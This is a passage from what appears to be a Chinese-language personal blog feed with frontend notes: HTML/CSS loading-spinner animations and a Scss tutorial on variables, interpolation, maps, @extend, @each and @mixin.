-<span class="number">0.3s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle2</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.2s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">0.2s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle3</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.1s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">0.1s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="keyword">@-webkit-keyframes</span> mycircle&#123;</span></span><br><span class="line"><span class="language-css">            <span class="number">0%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">0.0</span>);&#125;</span></span><br><span class="line"><span class="language-css">            <span class="number">40%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">1.0</span>);&#125;</span></span><br><span class="line"><span class="language-css">            <span class="number">80%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">0.0</span>);&#125;</span></span><br><span class="line"><span class="language-css">            <span class="number">100%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">0.0</span>);&#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="keyword">@keyframes</span> mycircle&#123;</span></span><br><span class="line"><span class="language-css">            <span class="number">0%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">0.0</span>);&#125;</span></span><br><span class="line"><span class="language-css">            <span class="number">40%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">1.0</span>);&#125;</span></span><br><span class="line"><span class="language-css">            <span class="number">80%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">0.0</span>);&#125;</span></span><br><span class="line"><span class="language-css">            <span class="number">100%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">0.0</span>);&#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">       </span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;loading3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;circle circle1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;circle circle2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;circle circle3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.loading4</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">width</span>: <span class="number">150px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">margin</span>: <span class="number">50px</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">text-align</span>: center;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.loading4</span>&gt;<span class="selector-tag">div</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">width</span>: <span class="number">18px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">height</span>: <span class="number">18px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">display</span>: inline-block;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">background-color</span>: <span class="number">#67CF22</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      -webkit-<span class="attribute">animation</span>: three <span class="number">1.4s</span> infinite ease-in-out;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">animation</span>: three <span class="number">1.4s</span> infinite ease-in-out;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      -webkit-<span class="attribute">animation-fill-mode</span>: both;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">animation-fill-mode</span>: both;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.loading4</span> <span class="selector-class">.three1</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.30s</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">animation-delay</span>: -<span class="number">0.30s</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.loading4</span> <span class="selector-class">.three2</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.15s</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">animation-delay</span>: -<span class="number">0.15s</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="keyword">@-webkit-keyframes</span> three &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="number">0%</span>,</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="number">80%</span>,</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="number">100%</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        -webkit-<span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.0</span>)</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="number">40%</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        -webkit-<span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.0</span>)</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="keyword">@keyframes</span> three &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="number">0%</span>,</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="number">80%</span>,</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="number">100%</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        -webkit-<span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.0</span>)</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="number">40%</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        -webkit-<span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.0</span>)</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;loading4&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;three1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;three2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;three3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;小功能&lt;/p&gt;
&lt;h3 id=&quot;Loading-动画&quot;&gt;&lt;a href=&quot;#Loading-动画&quot; class=&quot;headerlink&quot; title=&quot;Loading 动画&quot;&gt;&lt;/a&gt;Loading 动画&lt;/h3&gt;&lt;h4 id=&quot;第一种&quot;&gt;&lt;a href=&quot;#第一种&quot; cl</summary>
      
    
    
    
    <category term="css" scheme="https://hisai3.github.io/hisai3.github.io/categories/css/"/>
    
    
    <category term="css" scheme="https://hisai3.github.io/hisai3.github.io/tags/css/"/>
    
    <category term="css3" scheme="https://hisai3.github.io/hisai3.github.io/tags/css3/"/>
    
  </entry>
  
  <entry>
    <title>Scss</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/Scss/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/Scss/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-11-29T02:53:09.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Scss"><a href="#Scss" class="headerlink" title="Scss"></a>Scss</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>scss定义变量很简单就是加个 $ ,可以写在{} 内也可以不写，代表着全局变量和局部变量</p><p><strong>项目中想全局使用需要配置</strong></p><blockquote><ol><li>使用 <code>sass-resources-loader</code></li><li><a href="https://github.com/staven630/vue-cli4-config#log">vue-cli中配置scss全局变量</a></li></ol></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$width</span>:<span class="number">5px</span>;</span><br><span class="line"><span class="selector-class">.main</span>&#123;</span><br><span class="line">    <span class="variable">$heigth</span>：<span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>:<span class="variable">$width</span>;</span><br><span class="line">    <span class="selector-class">.child</span>&#123;</span><br><span class="line">        heigth:heigth;</span><br><span class="line">        <span class="attribute">width</span>:<span class="variable">$width</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插值语句"><a href="#插值语句" class="headerlink" title="插值语句"></a>插值语句</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span>: foo;</span><br><span class="line"><span class="variable">$attr</span>: border;</span><br><span class="line"><span class="selector-tag">p</span>.#&#123;<span class="variable">$name</span>&#125; &#123;</span><br><span class="line">  #&#123;<span class="variable">$attr</span>&#125;-<span class="attribute">color</span>: blue;</span><br><span class="line">  <span class="variable">$font-size</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="variable">$line-height</span>: <span class="number">30px</span>;</span><br><span class="line">  <span class="attribute">font</span>: #&#123;<span class="variable">$font-size</span>&#125;/#&#123;<span class="variable">$line-height</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="map-get-amp-maps"><a href="#map-get-amp-maps" class="headerlink" title="map-get()  &amp; maps"></a>map-get()  &amp; maps</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// maps</span></span><br><span class="line"><span class="variable">$social-colors</span>: (</span><br><span class="line">    dribble: <span class="number">#ea4c89</span>,</span><br><span class="line">    facebook: <span class="number">#3b5998</span>,</span><br><span class="line">    github: <span class="number">#171515</span>,</span><br><span class="line">    google: <span class="number">#db4437</span>,</span><br><span class="line">    twitter: <span class="number">#55acee</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设要获取 facebook 键值对应的值 #3b5998，我们就可以使用 map-get() 函数来实现：</span></span><br><span class="line"><span class="selector-class">.btn-dribble</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">map-get</span>(<span class="variable">$social-colors</span>,facebook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译后</span></span><br><span class="line"><span class="selector-class">.btn-dribble</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#3b5998</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend-指令"><a href="#extend-指令" class="headerlink" title="@extend 指令"></a>@extend 指令</h3><p><strong>在编译的时候，scss会在合并样式的时候，避免重复的css</strong></p><blockquote><p> % 占位符: 编译结果 % 实际时使用 extend 继承的类</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.error</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="keyword">@extend</span> .error;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line"><span class="selector-class">.error</span>, <span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果.error 只是用于extend, 可以用 % 占位符</span></span><br><span class="line">%error &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="keyword">@extend</span> %error;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果 .seriousError 替代了 %error</span></span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="each指令"><a href="#each指令" class="headerlink" title="@each指令"></a>@each指令</h3><p><strong>动态生成类名</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$colors</span>: (</span><br><span class="line">  blue: <span class="number">#008fff</span>,</span><br><span class="line">  grey: <span class="number">#909299</span>,</span><br><span class="line">  orange: <span class="number">#fa8c16</span>,</span><br><span class="line">  red: <span class="number">#fe5951</span>,</span><br><span class="line">  green: <span class="number">#2ac66a</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">@each</span> <span class="variable">$name</span>, <span class="variable">$color</span> in <span class="variable">$colors</span> &#123;</span><br><span class="line">     &amp;.#&#123;<span class="variable">$name</span>&#125; &#123;</span><br><span class="line">       <span class="selector-class">.label</span> &#123;</span><br><span class="line">         &amp;<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">           <span class="attribute">background-color</span>: <span class="variable">$color</span>;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line"><span class="keyword">@each</span> <span class="variable">$var</span> in(left,center,right)&#123;</span><br><span class="line">    <span class="selector-class">.text-</span>#&#123;<span class="variable">$var</span>&#125;&#123;</span><br><span class="line"><span class="attribute">text-align</span>:<span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.text-left</span>&#123;</span><br><span class="line">    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.text-center</span>&#123;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.text-right</span>&#123;</span><br><span class="line">    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mixin指令"><a href="#mixin指令" class="headerlink" title="@mixin指令"></a>@mixin指令</h3><p><strong>生成不同方向的三角形</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个三角的函数 实现不同方向的三角加兼容ie6</span></span><br><span class="line"><span class="comment">//第一个参数传入方向</span></span><br><span class="line"><span class="comment">//第二个参数传入大小</span></span><br><span class="line"><span class="comment">//第三个参数传入颜色</span></span><br><span class="line"><span class="comment">//注意:传入参数中间必须逗号分隔</span></span><br><span class="line"><span class="keyword">@mixin</span> triangle(<span class="variable">$x</span>, <span class="variable">$y</span>:<span class="number">10px</span>, <span class="variable">$z</span>:white )&#123;</span><br><span class="line">    <span class="keyword">@if</span> <span class="variable">$x</span> == <span class="string">&quot;top&quot;</span>&#123;</span><br><span class="line">        <span class="attribute">border-width</span>: <span class="variable">$y</span>;</span><br><span class="line">        <span class="attribute">border-color</span>:transparent transparent <span class="variable">$z</span> transparent;</span><br><span class="line">        <span class="attribute">border-style</span>: dashed dashed solid dashed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">@else</span> if <span class="variable">$x</span> == <span class="string">&quot;bottom&quot;</span>&#123;</span><br><span class="line">        <span class="attribute">border-width</span>: <span class="variable">$y</span>;</span><br><span class="line">        <span class="attribute">border-color</span>: <span class="variable">$z</span> transparent transparent transparent;</span><br><span class="line">        <span class="attribute">border-style</span>: solid dashed dashed dashed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">@else</span> if <span class="variable">$x</span> == <span class="string">&quot;left&quot;</span>&#123;</span><br><span class="line">        <span class="attribute">border-width</span>: <span class="variable">$y</span>;</span><br><span class="line">        <span class="attribute">border-color</span>:transparent <span class="variable">$z</span> transparent transparent;</span><br><span class="line">        <span class="attribute">border-style</span>: dashed solid dashed dashed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">@else</span> if <span class="variable">$x</span> == <span class="string">&quot;right&quot;</span>&#123;</span><br><span class="line">        <span class="attribute">border-width</span>: <span class="variable">$y</span>;</span><br><span class="line">        <span class="attribute">border-color</span>:transparent transparent transparent <span class="variable">$z</span>;</span><br><span class="line">        <span class="attribute">border-style</span>: dashed dashed dashed solid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="keyword">@include</span> triangle(right, <span class="number">200px</span>, red);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><p><code>#&#123;$animal&#125;</code>表示变量，后面直接连接想要的字符串</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span 